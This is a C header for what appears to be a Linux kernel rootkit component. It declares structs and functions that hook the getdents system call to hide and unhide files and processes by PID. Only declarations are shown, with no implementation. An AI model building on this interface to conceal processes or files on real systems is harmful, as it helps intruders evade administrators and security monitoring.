#ifndef GETDENTS_H
#define GETDENTS_H

#include <linux/fs.h>
#include <linux/fdtable.h>
#include <linux/slab.h>
#include <linux/fs_struct.h>
#include <linux/pid.h>
#include <linux/delay.h>
#include <linux/dirent.h>

/* struct for getdents entries */
struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[];
};

/* struct for hidden file descriptors */
struct fd_node {
	struct fdtable *table;
	struct file *file;
	int fd;
};

/* struct for hidden prcesses */
struct proc_node {
	int pid;
	struct task_struct *task;
};

void file_hide(void);
void file_unhide(void);

void process_hide(int proc_pid);
void process_unhide(int proc_pid);
void process_pop(void);
void process_reset(void);

int hook_getdents_init(void);
void hook_getdents_exit(void);

#endif